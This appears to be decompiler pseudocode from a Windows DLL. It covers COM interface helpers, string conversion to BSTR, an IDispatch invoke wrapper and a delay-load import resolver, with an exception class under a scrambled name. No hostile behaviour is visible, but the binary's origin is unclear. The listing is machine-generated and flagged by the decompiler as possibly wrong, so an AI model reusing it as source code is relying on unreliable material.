  v8 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095E14, &v7);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v7;
    sub_1004AD66(this, v4);
  }
  else
  {
    v5 = *this;
    if ( *this )
    {
      *this = 0;
      if ( v5 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v5 + 8))(v5);
    }
    v3 = -2147467262;
  }
  v8 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 1004AA88: conditional instruction was optimized away because %arg_0.4!=0

//----- (1004AAF0) --------------------------------------------------------
_DWORD *__usercall sub_1004AAF0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_10078DC0;
  if ( *a1 != a2 )
  {
    sub_10009821((int)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    a1[1] = result;
    *a1 = a2;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004AB3A) --------------------------------------------------------
int __thiscall sub_1004AB3A(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v5; // eax
  int v7; // [esp+Ch] [ebp-10h] BYREF
  int v8; // [esp+18h] [ebp-4h]

  v8 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095E14, &v7);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v7;
    sub_1004AD66(this, v4);
  }
  else
  {
    v5 = *this;
    if ( *this )
    {
      *this = 0;
      if ( v5 )
        (*(void (__stdcall **)(int))(*(_DWORD *)v5 + 8))(v5);
    }
    v3 = -2147467262;
  }
  v8 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 1004AB5C: conditional instruction was optimized away because %arg_0.4!=0

//----- (1004ABC4) --------------------------------------------------------
int __thiscall sub_1004ABC4(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095E44, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_1004AD97(this, v4);
  }
  else
  {
    sub_1004AD81(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 1004ABE6: conditional instruction was optimized away because %arg_0.4!=0

//----- (1004AC40) --------------------------------------------------------
int __thiscall sub_1004AC40(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095E34, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_1004ADC8(this, v4);
  }
  else
  {
    sub_1004ADB2(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 1004AC62: conditional instruction was optimized away because %arg_0.4!=0

//----- (1004ACBC) --------------------------------------------------------
int __thiscall sub_1004ACBC(int *this, int a2)
{
  int v3; // ebx
  int v4; // eax
  int v6; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  v7 = 0;
  if ( a2 )
  {
    v3 = (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_10095E24, &v6);
    if ( v3 < 0 )
      v4 = 0;
    else
      v4 = v6;
    sub_1004ADF9(this, v4);
  }
  else
  {
    sub_1004ADE3(this);
    v3 = -2147467262;
  }
  v7 = -1;
  if ( a2 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
  return v3;
}
// 1004ACDE: conditional instruction was optimized away because %arg_0.4!=0

//----- (1004AD38) --------------------------------------------------------
void __usercall sub_1004AD38(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1004AD66) --------------------------------------------------------
int __userpurge sub_1004AD66@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (1004AD81) --------------------------------------------------------
int *__usercall sub_1004AD81@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (1004AD97) --------------------------------------------------------
int __userpurge sub_1004AD97@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (1004ADB2) --------------------------------------------------------
int *__usercall sub_1004ADB2@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (1004ADC8) --------------------------------------------------------
int __userpurge sub_1004ADC8@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (1004ADE3) --------------------------------------------------------
int *__usercall sub_1004ADE3@<eax>(int *a1@<esi>)
{
  int v1; // eax

  v1 = *a1;
  if ( *a1 )
  {
    *a1 = 0;
    if ( v1 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v1 + 8))(v1);
  }
  return a1;
}

//----- (1004ADF9) --------------------------------------------------------
int __userpurge sub_1004ADF9@<eax>(_DWORD *a1@<esi>, int a2)
{
  int result; // eax

  if ( *a1 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)*a1 + 8))(*a1);
  result = a2;
  *a1 = a2;
  return result;
}

//----- (1004AEC0) --------------------------------------------------------
void __stdcall __noreturn sub_1004AEC0(int a1)
{
  off_100B5000(a1, 0);
}
// 100B5000: using guessed type int (__cdecl *off_100B5000)(_DWORD, _DWORD);

//----- (1004AED0) --------------------------------------------------------
void __stdcall __noreturn sub_1004AED0(int a1, int a2, int a3)
{
  int v3; // esi
  IErrorInfo *pperrinfo; // [esp+18h] [ebp-4h] BYREF

  pperrinfo = 0;
  if ( a2 )
  {
    if ( (**(int (__stdcall ***)(int, void *, int *))a2)(a2, &unk_1008B24C, &a2) >= 0 )
    {
      v3 = (*(int (__stdcall **)(int, int))(*(_DWORD *)a2 + 12))(a2, a3);
      (*(void (__stdcall **)(int))(*(_DWORD *)a2 + 8))(a2);
      if ( !v3 )
      {
        if ( GetErrorInfo(0, &pperrinfo) )
          pperrinfo = 0;
      }
    }
  }
  off_100B5000(a1, pperrinfo);
}
// 100B5000: using guessed type int (__cdecl *off_100B5000)(_DWORD, _DWORD);

//----- (1004AF50) --------------------------------------------------------
int sub_1004AF50(int a1, int a2, int a3, int a4, int a5, const WCHAR *a6, ...)
{
  int result; // eax
  int v7; // [esp+4h] [ebp-4h] BYREF
  va_list va; // [esp+24h] [ebp+1Ch] BYREF

  va_start(va, a6);
  result = sub_1004B480(a1, a2, a3, a4, a5, a6, (int)va, &v7);
  if ( result < 0 )
    off_100B5000(result, v7);
  return result;
}
// 100B5000: using guessed type int (__cdecl *off_100B5000)(_DWORD, _DWORD);

//----- (1004B040) --------------------------------------------------------
BSTR __stdcall sub_1004B040(LPCSTR lpString)
{
  int v1; // edi
  int v2; // eax
  int v3; // esi
  int LastError; // eax
  unsigned __int16 v5; // ax
  int v7; // eax
  void *v8; // esp
  _DWORD *v9; // ebx
  BSTR v10; // edi
  _DWORD v11[5]; // [esp+0h] [ebp-38h] BYREF
  _DWORD *v12; // [esp+14h] [ebp-24h]
  int v13; // [esp+18h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  if ( !lpString )
    return 0;
  v1 = lstrlenA(lpString) + 1;
  v13 = v1;
  v2 = MultiByteToWideChar(0, 0, lpString, v1, 0, 0);
  v3 = v2;
  v11[4] = v2;
  if ( !v2 )
    goto LABEL_3;
  ms_exc.registration.TryLevel = 0;
  v7 = 2 * v2;
  if ( v3 >= 4096 )
  {
    v9 = malloc(2 * v3);
    v12 = v9;
  }
  else
  {
    v8 = alloca(v7);
    ms_exc.old_esp = (DWORD)v11;
    v9 = v11;
    v12 = v11;
  }
  ms_exc.registration.TryLevel = -2;
  if ( !v9 )
    sub_1004AEC0(-2147024882);
  if ( !MultiByteToWideChar(0, 0, lpString, v1, (LPWSTR)v9, v3) )
  {
    if ( v3 >= 4096 )
      free(v9);
LABEL_3:
    if ( (int)GetLastError() <= 0 )
    {
      LastError = GetLastError();
      sub_1004AEC0(LastError);
    }
    v5 = GetLastError();
    sub_1004AEC0(v5 | 0x80070000);
  }
  v10 = SysAllocString((const OLECHAR *)v9);
  if ( v3 >= 4096 )
    free(v9);
  if ( !v10 )
    sub_1004AEC0(-2147024882);
  return v10;
}

//----- (1004B1D0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void *__stdcall sub_1004B1D0(LPCWCH lpWideCharStr)
{
  int v1; // edi
  int v2; // eax
  int v3; // esi
  int LastError; // eax
  unsigned __int16 v5; // ax
  void *v7; // ebx
  int v8; // eax
  _DWORD v9[9]; // [esp-10h] [ebp-30h] BYREF
  int v10; // [esp+1Ch] [ebp-4h]

  v9[8] = v9;
  if ( !lpWideCharStr )
    return 0;
  v1 = wcslen(lpWideCharStr) + 1;
  v2 = WideCharToMultiByte(0, 0, lpWideCharStr, v1, 0, 0, 0, 0);
  v3 = v2;
  if ( !v2 )
  {
    if ( (int)GetLastError() <= 0 )
    {
      LastError = GetLastError();
      sub_1004AEC0(LastError);
    }
    v5 = GetLastError();
    sub_1004AEC0(v5 | 0x80070000);
  }
  v10 = 0;
  v7 = operator new(v2);
  v10 = -1;
  if ( !v7 )
    sub_1004AEC0(-2147024882);
  if ( !WideCharToMultiByte(0, 0, lpWideCharStr, v1, (LPSTR)v7, v3, 0, 0) )
  {
    j__free(v7);
    if ( (int)GetLastError() > 0 )
      v8 = (unsigned __int16)GetLastError() | 0x80070000;
    else
      v8 = GetLastError();
    sub_1004AEC0(v8);
  }
  return v7;
}
// 1004B258: positive sp value 10 has been found
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004B370) --------------------------------------------------------
HANDLE __thiscall sub_1004B370(void *this)
{
  HANDLE result; // eax

  result = (HANDLE)*((_DWORD *)this + 2);
  *(_DWORD *)this = &_xho_fdflj::`vftable';
  if ( result )
    result = (HANDLE)(*(int (__stdcall **)(HANDLE))(*(_DWORD *)result + 8))(result);
  if ( *((_DWORD *)this + 3) )
  {
    result = GetProcessHeap();
    if ( result )
      return (HANDLE)HeapFree(result, 0, *((LPVOID *)this + 3));
  }
  return result;
}
// 1008B260: using guessed type void *_xho_fdflj::`vftable';

//----- (1004B3B0) --------------------------------------------------------
void __cdecl __noreturn sub_1004B3B0(int a1, int a2)
{
  int pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  pExceptionObject[0] = (int)&_xho_fdflj::`vftable';
  pExceptionObject[1] = a1;
  pExceptionObject[2] = a2;
  pExceptionObject[3] = 0;
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AV_xho_fdflj__);
}
// 1008B260: using guessed type void *_xho_fdflj::`vftable';

//----- (1004B3F0) --------------------------------------------------------
_DWORD *__thiscall sub_1004B3F0(_DWORD *this, int a2)
{
  int v3; // edx

  *this = &_xho_fdflj::`vftable';
  this[1] = *(_DWORD *)(a2 + 4);
  v3 = *(_DWORD *)(a2 + 8);
  this[2] = v3;
  this[3] = 0;
  if ( v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  return this;
}
// 1008B260: using guessed type void *_xho_fdflj::`vftable';

//----- (1004B430) --------------------------------------------------------
void *__thiscall sub_1004B430(void *Block, char a2)
{
  int v3; // eax
  HANDLE ProcessHeap; // eax

  v3 = *((_DWORD *)Block + 2);
  *(_DWORD *)Block = &_xho_fdflj::`vftable';
  if ( v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 8))(v3);
  if ( *((_DWORD *)Block + 3) )
  {
    ProcessHeap = GetProcessHeap();
    if ( ProcessHeap )
      HeapFree(ProcessHeap, 0, *((LPVOID *)Block + 3));
  }
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1008B260: using guessed type void *_xho_fdflj::`vftable';

//----- (1004B480) --------------------------------------------------------
int __cdecl sub_1004B480(int a1, int a2, int a3, int vt, int a5, LPCWSTR lpString, int a7, _DWORD *a8)
{
  int v9; // eax
  LPCWSTR v10; // edi
  void *v11; // esp
  _BYTE *v12; // ebx
  _BYTE *v13; // ecx
  unsigned __int16 v15; // si
  _DWORD *v16; // edx
  _DWORD *v17; // edx
  _DWORD *v18; // edx
  _BYTE *v19; // eax
  const WCHAR *v20; // ecx
  int v21; // esi
  _BYTE *v22; // edx
  unsigned int i; // edx
  _DWORD *v24; // eax
  _DWORD *v25; // ecx
  HRESULT v26; // ebx
  int v27; // ecx
  _BYTE v28[16]; // [esp+0h] [ebp-78h] BYREF
  ICreateErrorInfo v29[8]; // [esp+10h] [ebp-68h] BYREF
  int v30; // [esp+30h] [ebp-48h] BYREF
  int v31; // [esp+34h] [ebp-44h] BYREF
  _BYTE *v32; // [esp+38h] [ebp-40h]
  _BYTE *v33; // [esp+3Ch] [ebp-3Ch] BYREF
  int *v34; // [esp+40h] [ebp-38h]
  int v35; // [esp+44h] [ebp-34h]
  unsigned int v36; // [esp+48h] [ebp-30h]
  VARIANTARG pvarg; // [esp+4Ch] [ebp-2Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+60h] [ebp-18h]

  if ( !a1 )
    return -2147467261;
  if ( a8 )
    *a8 = 0;
  v9 = 0;
  v33 = 0;
  v34 = 0;
  v35 = 0;
  v36 = 0;
  v10 = lpString;
  if ( lpString )
  {
    v9 = lstrlenW(lpString);
    v35 = v9;
  }
  v30 = -3;
  if ( (a3 & 0xC) != 0 )
  {
    if ( !v9 )
      return -2147024809;
    v36 = 1;
    v34 = &v30;
  }
  if ( v9 )
  {
    v11 = alloca(16 * v9);
    ms_exc.old_esp = (DWORD)v28;
    v12 = v28;
    v32 = v28;
    ms_exc.registration.TryLevel = -2;
    memset(v28, 0, 16 * v9);
    v33 = v28;
    v13 = &v28[16 * v35 - 16];
    if ( *lpString )
    {
      do
      {
        v15 = *v10 & 0xF7FF;
        *(_WORD *)v13 = v15;
        if ( v15 > 0x4002u )
        {
          switch ( v15 )
          {
            case 0x4003u:
            case 0x4004u:
            case 0x4005u:
            case 0x4006u:
            case 0x4007u:
            case 0x4008u:
            case 0x4009u:
            case 0x400Au:
            case 0x400Bu:
            case 0x400Cu:
            case 0x400Du:
            case 0x400Eu:
            case 0x4010u:
            case 0x4011u:
            case 0x4012u:
            case 0x4013u:
            case 0x4014u:
            case 0x4015u:
            case 0x4016u:
            case 0x4017u:
            case 0x4019u:
            case 0x4024u:
              goto LABEL_25;
            default:
LABEL_24:
              if ( (v15 & 0x2000) != 0 )
                goto LABEL_25;
              return -2147024809;
          }
        }
        if ( v15 == 16386 )
        {
LABEL_25:
          a7 += 4;
          *((_DWORD *)v13 + 2) = *(_DWORD *)(a7 - 4);
        }
        else
        {
          switch ( v15 )
          {
            case 2u:
            case 0x12u:
              a7 += 4;
              *((_WORD *)v13 + 4) = *(_WORD *)(a7 - 4);
              goto LABEL_26;
            case 3u:
            case 8u:
            case 9u:
            case 0xAu:
            case 0xDu:
            case 0x13u:
            case 0x16u:
            case 0x17u:
            case 0x19u:
            case 0x24u:
              goto LABEL_25;
            case 4u:
              *(_WORD *)v13 = 5;
              break;
            case 5u:
            case 7u:
            case 0x14u:
            case 0x15u:
              break;
            case 6u:
              a7 += 4;
              v16 = *(_DWORD **)(a7 - 4);
              *((_DWORD *)v13 + 2) = *v16;
              *((_DWORD *)v13 + 3) = v16[1];
              goto LABEL_26;
            case 0xBu:
              a7 += 4;
              *((_WORD *)v13 + 4) = -(*(_WORD *)(a7 - 4) != 0);
              goto LABEL_26;
            case 0xCu:
              a7 += 4;
              v17 = *(_DWORD **)(a7 - 4);
              *(_DWORD *)v13 = *v17;
              *((_DWORD *)v13 + 1) = v17[1];
              *((_DWORD *)v13 + 2) = v17[2];
              *((_DWORD *)v13 + 3) = v17[3];
              goto LABEL_26;
            case 0xEu:
              a7 += 4;
              v18 = *(_DWORD **)(a7 - 4);
              *(_DWORD *)v13 = *v18;
              *((_DWORD *)v13 + 1) = v18[1];
              *((_DWORD *)v13 + 2) = v18[2];
              *((_DWORD *)v13 + 3) = v18[3];
              *(_WORD *)v13 = 14;
              goto LABEL_26;
            case 0x10u:
            case 0x11u:
              a7 += 4;
              v13[8] = *(_BYTE *)(a7 - 4);
              goto LABEL_26;
            default:
              goto LABEL_24;
          }
          a7 += 8;
          *((_DWORD *)v13 + 2) = *(_DWORD *)(a7 - 8);
          *((_DWORD *)v13 + 3) = *(_DWORD *)(a7 - 4);
        }
LABEL_26:
        v13 -= 16;
        ++v10;
      }
      while ( *v10 );
    }
    v19 = &v28[16 * v36];
    v20 = &lpString[v35 - v36 - 1];
    v21 = 0;
    if ( v20 >= lpString )
    {
      do
      {
        if ( (*v20 & 0xBFFF) != 2060 )
          break;
        v22 = (*v20 & 0x4000) != 0 ? (_BYTE *)*((_DWORD *)v19 + 2) : v19;
        if ( *(_WORD *)v22 != 10 )
          break;
        if ( *((_DWORD *)v22 + 2) != -2147352572 )
          break;
        ++v21;
        v19 += 16;
        --v20;
      }
      while ( v20 >= lpString );
      v12 = v32;
    }
    if ( v21 )
    {
      for ( i = 0; i < v36; ++i )
      {
        v24 = &v12[16 * i];
        v25 = &v12[16 * i + 16 * v21];
        *v25 = *v24;
        v25[1] = v24[1];
        v25[2] = v24[2];
        v25[3] = v24[3];
      }
      v35 -= v21;
      v33 += 16 * v21;
    }
  }
  VariantInit(&pvarg);
  memset(v29, 0, sizeof(v29));
  v31 = -1;
  v26 = (*(int (__stdcall **)(int, int, void *, _DWORD, int, _BYTE **, VARIANTARG *, ICreateErrorInfo *, int *))(*(_DWORD *)a1 + 24))(
          a1,
          a2,
          &unk_1008B264,
          0,
          a3,
          &v33,
          (_WORD)vt != 0 ? &pvarg : 0,
          v29,
          &v31);
  if ( v26 < 0 )
  {
    VariantClear(&pvarg);
    if ( v26 == -2147352567 )
      return sub_1004BB70(vt, v29, a8);
    return v26;
  }
  if ( !(_WORD)vt || !a5 )
    return v26;
  if ( (_WORD)vt == 12 )
    goto LABEL_50;
  v27 = *(_DWORD *)&pvarg.vt;
  if ( (_WORD)vt != pvarg.vt )
  {
    v26 = VariantChangeType(&pvarg, &pvarg, 0, vt);
    if ( v26 < 0 )
    {
      VariantClear(&pvarg);
      return v26;
    }
LABEL_50:
    v27 = *(_DWORD *)&pvarg.vt;
  }
  if ( (unsigned __int16)vt <= 0x4002u )
  {
    if ( (unsigned __int16)vt != 16386 )
    {
      switch ( (__int16)vt )
      {
        case 2:
          *(_WORD *)a5 = pvarg.iVal;
          return v26;
        case 3:
        case 8:
        case 22:
          break;
        case 4:
          *(float *)a5 = pvarg.fltVal;
          return v26;
        case 5:
        case 7:
          *(double *)a5 = pvarg.dblVal;
          return v26;
        case 6:
        case 21:
          *(_QWORD *)a5 = pvarg.llVal;
          return v26;
        case 9:
        case 13:
        case 23:
          goto LABEL_59;
        case 10:
        case 19:
        case 25:
        case 36:
          goto LABEL_68;
        case 11:
          *(_WORD *)a5 = pvarg.iVal;
          return v26;
        case 12:
          *(_DWORD *)a5 = v27;
          *(_QWORD *)(a5 + 4) = *(_QWORD *)&pvarg.decVal.Hi32;
          *(_DWORD *)(a5 + 12) = pvarg.cyVal.Hi;
          return v26;
        case 14:
          *(_DWORD *)a5 = v27;
          *(_DWORD *)(a5 + 4) = pvarg.decVal.Hi32;
          *(_QWORD *)(a5 + 8) = pvarg.llVal;
          return v26;
        case 16:
          *(_BYTE *)a5 = pvarg.bVal;
          return v26;
        case 17:
          *(_BYTE *)a5 = pvarg.bVal;
          return v26;
        case 18:
          *(_WORD *)a5 = pvarg.iVal;
          return v26;
        case 20:
          *(_QWORD *)a5 = pvarg.llVal;
          return v26;
        default:
          goto LABEL_69;
      }
    }
LABEL_55:
    *(_DWORD *)a5 = pvarg.lVal;
    return v26;
  }
  switch ( (__int16)vt )
  {
    case 16387:
    case 16391:
    case 16393:
    case 16396:
    case 16400:
    case 16403:
    case 16404:
      goto LABEL_55;
    case 16388:
    case 16390:
    case 16394:
    case 16397:
    case 16401:
    case 16405:
    case 16406:
    case 16409:
LABEL_59:
      *(_DWORD *)a5 = pvarg.lVal;
      return v26;
    case 16389:
    case 16392:
    case 16395:
    case 16398:
    case 16402:
    case 16407:
    case 16420:
      goto LABEL_68;
    default:
LABEL_69:
      if ( (vt & 0x2000) != 0 )
      {
LABEL_68:
        *(_DWORD *)a5 = pvarg.lVal;
        return v26;
      }
      VariantClear(&pvarg);
      break;
  }
  return -2147024809;
}
// 1004B480: using guessed type int vt;

//----- (1004BA60) --------------------------------------------------------
int sub_1004BA60(int a1, int a2, int a3, int a4, int a5, const WCHAR *a6, ...)
{
  int result; // eax
  int v7; // esi
  IErrorInfo *perrinfo; // [esp+4h] [ebp-4h] BYREF
  va_list va; // [esp+24h] [ebp+1Ch] BYREF

  va_start(va, a6);
  result = sub_1004B480(a1, a2, a3, a4, a5, a6, (int)va, &perrinfo);
  v7 = result;
  if ( result < 0 )
  {
    SetErrorInfo(0, perrinfo);
    return v7;
  }
  return result;
}

//----- (1004BB70) --------------------------------------------------------
int __userpurge sub_1004BB70@<eax>(int a1@<edi>, ICreateErrorInfo *pperrinfo, _DWORD *a3)
{
  ICreateErrorInfo *v3; // esi
  struct ICreateErrorInfoVtbl *lpVtbl; // eax
  _DWORD *v5; // edi
  unsigned __int16 v6; // ax

  v3 = pperrinfo;
  lpVtbl = pperrinfo[6].lpVtbl;
  if ( lpVtbl )
    ((void (__stdcall *)(ICreateErrorInfo *))lpVtbl)(pperrinfo);
  v5 = a3;
  pperrinfo = 0;
  if ( a3 && CreateErrorInfo(&pperrinfo) >= 0 )
  {
    ((void (__stdcall *)(ICreateErrorInfo *, void *, int))pperrinfo->lpVtbl->SetGUID)(pperrinfo, &unk_1008B284, a1);
    if ( v3[1].lpVtbl )
      (*(void (__stdcall **)(_DWORD *, struct ICreateErrorInfoVtbl *))(*a3 + 16))(a3, v3[1].lpVtbl);
    if ( v3[2].lpVtbl )
      (*(void (__stdcall **)(_DWORD *, struct ICreateErrorInfoVtbl *))(*a3 + 20))(a3, v3[2].lpVtbl);
    if ( v3[3].lpVtbl )
      (*(void (__stdcall **)(_DWORD *, struct ICreateErrorInfoVtbl *))(*a3 + 24))(a3, v3[3].lpVtbl);
    (*(void (__stdcall **)(_DWORD *, struct ICreateErrorInfoVtbl *))(*a3 + 28))(a3, v3[4].lpVtbl);
    if ( (*(int (__stdcall **)(_DWORD *, void *, _DWORD *))*a3)(a3, &unk_1008B274, v5) < 0 )
      *v5 = 0;
    (*(void (__cdecl **)(_DWORD *))(*a3 + 8))(a3);
  }
  if ( v3[1].lpVtbl )
    SysFreeString((BSTR)v3[1].lpVtbl);
  if ( v3[2].lpVtbl )
    SysFreeString((BSTR)v3[2].lpVtbl);
  if ( v3[3].lpVtbl )
    SysFreeString((BSTR)v3[3].lpVtbl);
  v6 = (unsigned __int16)v3->lpVtbl;
  if ( !LOWORD(v3->lpVtbl) )
    return (int)v3[7].lpVtbl;
  if ( v6 < 0xFE00u )
    return v6 - 2147220992;
  return -2147155969;
}
// 1004BB70: could not find valid save-restore pair for edi

//----- (1004C3EA) --------------------------------------------------------
int __userpurge sub_1004C3EA@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<ecx>, int a3)
{
  if ( !a3 )
    return 0;
  while ( --a3 && *a1 == *a2 )
  {
    ++a1;
    ++a2;
  }
  return (unsigned __int8)*a1 - (unsigned __int8)*a2;
}

//----- (1004C43A) --------------------------------------------------------
int __stdcall sub_1004C43A(_DWORD *a1)
{
  _DWORD *v1; // ecx
  int result; // eax

  v1 = a1;
  for ( result = 0; *v1; ++result )
    ++v1;
  return result;
}

//----- (1004C465) --------------------------------------------------------
int *__thiscall sub_1004C465(int *this)
{
  int *result; // eax
  _DWORD *v2; // edx

  result = &dword_100BC8DC;
  if ( dword_100BC8DC )
  {
    while ( 1 )
    {
      v2 = (_DWORD *)*result;
      if ( (int *)*result == this )
        break;
      result = (int *)*result;
      if ( !*v2 )
        goto LABEL_4;
    }
  }
  else
  {
LABEL_4:
    if ( (int *)*result != this )
      return result;
  }
  *result = *this;
  return result;
}
// 100BC8DC: using guessed type int dword_100BC8DC;

//----- (1004C548) --------------------------------------------------------
int __stdcall sub_1004C548(int *a1, int *Arguments)
{
  int *v2; // esi
  int v3; // ebx
  char *v4; // edi
  const CHAR *v5; // ecx
  char *v6; // ebx
  char *v7; // edx
  bool v8; // zf
  HMODULE LibraryA; // edi
  int v11; // edx
  const CHAR *v12; // eax
  FARPROC ProcAddress; // ebx
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  int v16[3]; // [esp+Ch] [ebp-44h] BYREF
  LPCSTR lpLibFileName; // [esp+18h] [ebp-38h]
  BOOL v18; // [esp+1Ch] [ebp-34h]
  LPCSTR lpProcName; // [esp+20h] [ebp-30h]
  HMODULE v20; // [esp+24h] [ebp-2Ch]
  int (__stdcall *v21)(); // [esp+28h] [ebp-28h]
  DWORD LastError; // [esp+2Ch] [ebp-24h]
  volatile LONG *Target; // [esp+38h] [ebp-18h]
  char *v24; // [esp+44h] [ebp-Ch]
  int v25; // [esp+4Ch] [ebp-4h]

  v2 = a1;
  v3 = a1[3];
  v4 = (char *)&_ImageBase + a1[5];
  v5 = (char *)&_ImageBase + a1[1];
  Target = (volatile LONG *)((char *)&_ImageBase + a1[2]);
  v6 = (char *)&_ImageBase + v3;
  v7 = (char *)&_ImageBase + a1[4];
  v25 = a1[7];
  lpLibFileName = v5;
  v24 = v4;
  v16[2] = (int)Arguments;
  v8 = (*a1 & 1) == 0;
  v16[0] = 36;
  v16[1] = (int)a1;
  v18 = 0;
  lpProcName = 0;
  v20 = 0;
  v21 = 0;
  LastError = 0;
  if ( v8 )
  {
    Arguments = v16;
    RaiseException(0xC06D0057, 0, 1u, (const ULONG_PTR *)&Arguments);
    return 0;
  }
  LibraryA = (HMODULE)*Target;
  v11 = *(_DWORD *)&v7[4 * (((char *)Arguments - v6) >> 2)];
  a1 = (int *)(4 * (((char *)Arguments - v6) >> 2));
  v18 = v11 >= 0;
  v12 = (char *)&word_10000002 + v11;
  if ( v11 < 0 )
    v12 = (const CHAR *)(unsigned __int16)v11;
  lpProcName = v12;
  ProcAddress = 0;
  if ( !dword_100BC8E4 || (ProcAddress = (FARPROC)dword_100BC8E4(0, v16)) == 0 )
  {
    if ( !LibraryA )
    {
      if ( !dword_100BC8E4 || (LibraryA = (HMODULE)dword_100BC8E4(1, v16)) == 0 )
      {
        LibraryA = LoadLibraryA(lpLibFileName);
        if ( !LibraryA )
        {
          LastError = GetLastError();
          if ( !dword_100BC8E0 || (LibraryA = (HMODULE)dword_100BC8E0(3, v16)) == 0 )
          {
            Arguments = v16;
            RaiseException(0xC06D007E, 0, 1u, (const ULONG_PTR *)&Arguments);
            return (int)v21;
          }
        }
      }
      if ( (HMODULE)InterlockedExchange(Target, (LONG)LibraryA) == LibraryA )
      {
        FreeLibrary(LibraryA);
      }
      else if ( v2[6] )
      {
        v14 = LocalAlloc(0x40u, 8u);
        if ( v14 )
        {
          v14[1] = v2;
          *v14 = dword_100BC8DC;
          dword_100BC8DC = (int)v14;
        }
      }
    }
    v20 = LibraryA;
    if ( dword_100BC8E4 )
      ProcAddress = (FARPROC)dword_100BC8E4(2, v16);
    if ( !ProcAddress )
    {
      if ( !v2[5]
        || !v2[7]
        || (v15 = (_DWORD *)((char *)LibraryA + *((_DWORD *)LibraryA + 15)), *v15 != 17744)
        || v15[2] != v25
        || LibraryA != (HMODULE)v15[13]
        || (ProcAddress = *(FARPROC *)&v24[(_DWORD)a1]) == 0 )
      {
        ProcAddress = GetProcAddress(LibraryA, lpProcName);
        if ( !ProcAddress )
        {
          LastError = GetLastError();
          if ( dword_100BC8E0 )
            ProcAddress = (FARPROC)dword_100BC8E0(4, v16);
          if ( !ProcAddress )
          {
            a1 = v16;
            RaiseException(0xC06D007F, 0, 1u, (const ULONG_PTR *)&a1);
            ProcAddress = v21;
          }
        }
      }
    }
    *Arguments = (int)ProcAddress;
  }
  if ( dword_100BC8E4 )
  {
    LastError = 0;
    v20 = LibraryA;
    v21 = ProcAddress;
    dword_100BC8E4(5, v16);
  }
  return (int)ProcAddress;
}
// 10000000: using guessed type __int16 _ImageBase;
